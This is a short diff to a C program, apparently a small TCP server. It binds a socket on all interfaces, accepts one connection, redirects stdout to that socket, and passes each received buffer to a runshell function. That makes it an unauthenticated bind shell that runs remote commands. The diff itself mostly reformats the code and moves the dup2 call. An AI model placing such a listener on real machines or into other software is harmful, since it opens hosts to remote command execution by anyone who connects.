@@ -30,29 +30,33 @@ int main(int argc, char const *argv[])
     }
     address.sin_family = AF_INET;
     address.sin_addr.s_addr = INADDR_ANY;
-    address.sin_port = htons( PORT );
+    address.sin_port = htons(PORT);
 
-    // Forcefully attaching socket to the port 8080
-    if (bind(server_fd, (struct sockaddr *)&address,
-                                 sizeof(address))<0)
+    // Forcefully attaching socket to the port
+    if (bind(server_fd, (struct sockaddr *)&address, sizeof(address))<0)
     {
         perror("bind failed"); // Prints system error
         exit(EXIT_FAILURE);
     }
+
     if (listen(server_fd, 3) < 0)
     {
         perror("listen"); // Prints system error
         exit(EXIT_FAILURE);
     }
+    printf("server listening on port %i\n", PORT);
+
     if ((new_socket = accept(server_fd, (struct sockaddr *)&address, (socklen_t*)&addrlen)) < 0)
     {
-        perror("accept"); //accept since the socket and address are valid.
+        perror("accept");
         exit(EXIT_FAILURE);
     }
-    dup2(new_socket, STDOUT_FILENO ); /* duplicate socket on stdout */
-    while(1){
+
+    while(new_socket){
         valread = read(new_socket , buffer, 1024);
+        dup2(new_socket, STDOUT_FILENO );
         runshell(buffer);
     }
+
     return 0;
 }
